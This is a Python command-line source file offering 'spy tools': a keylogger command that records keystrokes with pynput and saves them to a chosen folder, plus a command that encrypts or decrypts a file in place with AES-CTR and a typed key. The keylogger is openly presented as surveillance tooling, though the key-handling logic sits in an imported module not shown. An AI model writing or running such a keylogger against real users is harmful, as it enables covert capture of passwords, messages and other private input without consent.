import os, click
from pynput.keyboard import Listener
from lash.Exportables.ikeyboard import *
from lash.executor import playbp
import pyaes as pya


@click.group('spy', help='Spy tools')
def spy():
    ...


@spy.command(help='Keylogger')
@click.option('-p', type=click.Path(exists=True), default='.', help='Path to send output file with info')
def keyboard(p):
    print('<key logger on> f3 to stop record')
    os.chdir(p)
    listener = Listener(on_press=key_down, on_release=key_up)
    listener.start()
    listener.join()
    playbp()
    print(f'> Process Finished <')


@spy.command()
@click.argument('file', metavar='<file>', type=click.STRING)
@click.argument('key', metavar='<key>', type=click.STRING)
@click.argument('p', metavar='path', type=click.Path(exists=True), required=False, default='.')
@click.option('-dc', is_flag=True, default=False, help='Decrypt file')
def crypt(file, key, p, dc=False):
    """\b
    Encrypt/Decrypt files with AES algorithm
    \b
    Save the <key> you need her to decode
    The key NEED have 16 characters
    \b
    Ex: crypt text.txt $kvzis1@7y602qsx
    """
    bkey = str.encode(key)  # Convert to bytes
    fp = p + '\\' + file

    file = open(fp, 'rb')
    crip = pya.AESModeOfOperationCTR(bkey)
    if dc:
        data = crip.decrypt(file.read())
        crypted = open(fp, 'wb')
        crypted.write(data)
        print(f'\nFile decrypted successfully')
    else:
        data = crip.encrypt(file.read())
        file.close()

        crypted = open(fp, 'wb')
        crypted.write(data)
        print(f'\nFile encrypted with key: {key}')
